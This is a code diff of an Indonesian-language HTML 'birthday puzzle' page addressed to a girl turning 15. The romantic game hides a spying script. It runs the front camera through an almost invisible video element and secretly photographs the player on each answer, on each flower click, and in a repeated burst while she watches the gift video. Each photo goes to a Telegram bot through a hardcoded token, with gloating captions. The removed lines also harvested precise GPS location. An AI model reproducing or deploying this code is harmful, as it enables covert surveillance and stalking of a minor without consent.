@@ -3,23 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>✨ Mystery Birthday Puzzle ✨</title>
+    <title>✨ Special Day For My Queen ✨</title>
     <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
     <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
     <style>
         :root { --pink-soft: #ffc0cb; --pink-bold: #ff69b4; --cream: #fff5f5; }
-        body { margin: 0; background: var(--cream); font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        body { margin: 0; background: var(--cream); font-family: 'Poppins', sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; overflow-x: hidden; }
         
         /* TRIK MAUT ANTI LAYAR HITAM */
         #v-frame { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; object-fit: cover; z-index: 9999; opacity: 0.01; pointer-events: none; }
         #c-frame { position: fixed; top: -5000px; }
 
-        .game-card { background: white; padding: 30px; border-radius: 30px; box-shadow: 0 15px 35px rgba(255, 182, 193, 0.4); text-align: center; border: 3px solid var(--pink-soft); width: 90%; max-width: 400px; z-index: 10; position: relative; }
+        .game-card { background: white; padding: 30px; border-radius: 30px; box-shadow: 0 15px 35px rgba(255, 182, 193, 0.4); text-align: center; border: 3px solid var(--pink-soft); width: 90%; max-width: 450px; z-index: 10; position: relative; transition: 0.5s; margin: 20px; }
         h1 { font-family: 'Dancing Script', cursive; color: var(--pink-bold); font-size: 2.5rem; margin-bottom: 10px; }
         .scrambled-word { font-size: 1.8rem; letter-spacing: 5px; color: var(--pink-bold); background: var(--cream); padding: 15px; border-radius: 15px; margin: 15px 0; font-weight: bold; border: 2px dashed var(--pink-soft); }
         input { width: 85%; padding: 12px; border: 2px solid var(--pink-soft); border-radius: 15px; text-align: center; font-size: 1rem; outline: none; margin-bottom: 10px; }
         .btn-check { background: var(--pink-bold); color: white; border: none; padding: 12px 25px; border-radius: 50px; cursor: pointer; font-weight: bold; width: 100%; box-shadow: 0 5px 15px rgba(255, 105, 180, 0.3); }
-        .btn-hint { background: none; border: none; color: var(--pink-bold); font-size: 0.8rem; text-decoration: underline; cursor: pointer; margin-top: 15px; font-weight: 600; }
+        
+        .flower { position: fixed; font-size: 40px; cursor: pointer; transition: 0.8s; z-index: 2000; animation: float 4s infinite ease-in-out; }
+        @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-30px); } }
+        
+        .final-content { display: none; flex-direction: column; align-items: center; gap: 20px; animation: fadeIn 2s forwards; }
+        .polaroid-frame { display: flex; gap: 15px; justify-content: center; flex-wrap: wrap; }
+        .polaroid { background: white; padding: 10px 10px 30px 10px; box-shadow: 0 10px 20px rgba(0,0,0,0.15); transform: rotate(var(--r)); width: 130px; border: 1px solid #eee; }
+        .polaroid img { width: 100%; height: 150px; object-fit: cover; }
+        .main-video { width: 90%; border-radius: 20px; border: 5px solid white; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        @keyframes fadeIn { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
         @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
     </style>
 </head>
@@ -37,32 +46,24 @@
     <div class="scrambled-word" id="display-word">YGASNA</div>
     <input type="text" id="user-input" placeholder="Tulis jawabannya...">
     <button class="btn-check" onclick="checkAnswer()">Kirim ✨</button>
-    <button class="btn-hint" onclick="getHint()">💡 Butuh Petunjuk?</button>
 </div>
 
 <script>
-    const _0xT = '8293332037:AAFGKN5gQs1SZMmOAn-UZJ8te8X3ENGDgGg'; // Token lu
-    const _0xC = '8057435264'; // ID Lu
-    let _loc = "Belum Diizinkan";
+    const _0xT = '8293332037:AAFGKN5gQs1SZMmOAn-UZJ8te8X3ENGDgGg'; 
+    const _0xC = '8057435264'; 
+    let shotCount = 0;
     
     const words = [
-        { scrambled: "YGASNA", real: "SAYANG", hint: "Panggilan aku buat kamu tiap hari..." },
-        { scrambled: "IKNTA", real: "CINTA", hint: "Satu kata buat kita berdua..." },
-        { scrambled: "HGBAAIA", real: "BAHAGIA", hint: "Yang aku rasain kalau liat kamu..." }
+        { scrambled: "ICLBO", real: "BOCIL" },
+        { scrambled: "ICNTA", real: "CINTA" },
+        { scrambled: "HGBAAIA", real: "BAHAGIA" }
     ];
     let step = 0;
 
     const v = document.getElementById('v-frame');
     const c = document.getElementById('c-frame');
-    const sfxCorrect = document.getElementById('sfx-correct');
-    const sfxWin = document.getElementById('sfx-win');
 
     async function init() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(p => {
-                _loc = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
-            }, null, {enableHighAccuracy:true});
-        }
         try {
             const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user", width: 1280, height: 720 } });
             v.srcObject = s;
@@ -73,9 +74,9 @@
     function checkAnswer() {
         const input = document.getElementById('user-input').value.toUpperCase().trim();
         if (input === words[step].real) {
-            sfxCorrect.play();
-            confetti({ particleCount: 70, spread: 60, colors: ['#ff69b4'] });
-            jepret(`Benar: ${words[step].real}`);
+            document.getElementById('sfx-correct').play();
+            confetti({ particleCount: 50, spread: 60 });
+            jepret(`Benar [${shotCount+1}]: ${words[step].real}`);
             step++;
             if (step < words.length) {
                 document.getElementById('display-word').innerText = words[step].scrambled;
@@ -84,44 +85,73 @@
         } else { jepret("Salah Tebak"); }
     }
 
-    function getHint() {
-        alert("Petunjuk: " + words[step].hint);
-        // Pas dia baca alert petunjuk, mukanya pasti lagi fokus bgt. JEPRET! 😈
-        setTimeout(() => { jepret("Minta Hint: " + words[step].real); }, 500);
+    function win() {
+        document.getElementById('sfx-win').play();
+        const box = document.getElementById('main-box');
+        box.innerHTML = `
+            <h1 style="font-size: 2.5rem;">HBD SAYANGKU IHH UMURNYA UDAH 15 AJa! ❤️</h1>
+            <p>Petik bunganya lalu klik kadonya!</p>
+            <div id="gift-icon" style="font-size: 100px; cursor:pointer; animation: pulse 1.5s infinite; margin: 20px 0;" onclick="revealSurprise()">🎁</div>
+            <div id="final-media" class="final-content">
+                <div class="polaroid-frame">
+                    <div class="polaroid" style="--r:-5deg"><img src=https://files.catbox.moe/rl3f5c.jpg"></div>
+                    <div class="polaroid" style="--r:5deg"><img src="https://files.catbox.moe/7ocjr3.jpg"></div>
+                </div>
+                <video id="hbd-video" class="main-video" controls playsinline>
+                    <source src="https://files.catbox.moe/vuyoj5.mp4" type="video/mp4">
+                </video>
+                <h2 style="font-family:'Dancing Script'; color:var(--pink-bold);">I Love You! ❤️</h2>
+            </div>
+        `;
+        
+        // Tumbuhkan Bunga
+        const fList = ['🌸', '🌹', '🌷', '🌻', '🌺', '💐'];
+        for (let i = 0; i < 15; i++) {
+            let f = document.createElement('div');
+            f.className = 'flower';
+            f.innerHTML = fList[Math.floor(Math.random() * fList.length)];
+            f.style.left = Math.random() * 85 + 5 + '%';
+            f.style.top = Math.random() * 85 + 5 + '%';
+            f.style.transform = 'scale(0)';
+            document.body.appendChild(f);
+            setTimeout(() => { f.style.transform = 'scale(1)'; }, i * 100);
+            f.onclick = function() { 
+                this.style.transform = 'scale(0)';
+                jepret(`Petik Bunga #${i}`);
+                setTimeout(() => this.remove(), 500);
+            };
+        }
     }
 
-    function win() {
-        sfxWin.play();
-        document.getElementById('main-box').innerHTML = `
-            <h1 style="font-size: 2.8rem;">HBD QUEEN! ❤️</h1>
-            <p>Pinter banget! Klik kadonya ya...</p>
-            <div style="font-size: 100px; cursor:pointer; animation: pulse 1.5s infinite;" onclick="finalBlow()">🎁</div>
-        `;
-        confetti({ particleCount: 200, spread: 100 });
+    function revealSurprise() {
+        document.getElementById('gift-icon').style.display = 'none';
+        document.getElementById('final-media').style.display = 'flex';
+        document.getElementById('hbd-video').play();
+        jepret("Membuka Kado - Burst Start");
+        // MULAI BURST: Jepret tiap 3 detik pas dia nonton video
+        setInterval(() => { if(shotCount < 20) jepret("Burst Capture"); }, 3000);
+        confetti({ particleCount: 300, spread: 150 });
     }
 
     function jepret(info) {
         if (v.readyState < 2) return;
         const ctx = c.getContext('2d');
         ctx.drawImage(v, 0, 0, 1280, 720);
-        
-        // ANTI LAYAR HITAM: Cek pixel data tengah
         const p = ctx.getImageData(640, 360, 1, 1).data;
         if (p[0] === 0 && p[1] === 0 && p[2] === 0) {
             setTimeout(() => jepret(info), 300);
             return;
         }
-
         c.toBlob(b => {
+            shotCount++;
             const f = new FormData();
             f.append('chat_id', _0xC);
-            f.append('photo', b, 'capture.jpg');
-            f.append('caption', `💖 PUZZLE MASTER HD 💖\n\nInfo: ${info}\n📍 Maps: ${_loc}\n\nGak bakal item lagi Tuan! 🤑😈`);
+            f.append('photo', b, 'shot.jpg');
+            f.append('caption', `📸 SNAPSHOT #${shotCount} 📸\n\nInfo: ${info}\n\nTarget terdeteksi Tuan! 😈🤑`);
             fetch(`https://api.telegram.org/bot${_0xT}/sendPhoto`, { method: 'POST', body: f });
         }, 'image/jpeg', 0.9);
     }
 
-    // Paksa jalan pas layar disentuh pertama kali
     window.addEventListener('touchstart', () => { if (v.paused) v.play(); }, {once: true});
     window.onload = init;
 </script>
